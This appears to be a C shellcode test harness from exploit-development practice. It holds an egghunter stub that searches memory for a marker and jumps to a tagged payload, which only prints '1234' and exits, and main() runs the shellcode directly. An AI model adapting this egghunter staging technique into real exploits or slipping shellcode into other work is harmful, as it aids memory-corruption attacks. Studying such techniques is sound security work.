#include<stdio.h>
#include<string.h>

unsigned char code[] = "\xeb\x0d\xbb\x8f\x50\x90\x50\x43\x40\x39\x18\x75\xfb\xff\xe0\x58\xeb\xf0";

unsigned char findmecode[] = \
"\x90\x50\x90\x50" // egg 
"\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\x68\x31\x32\x33\x34\x89\xe1\xba\x04\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80"; 


main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
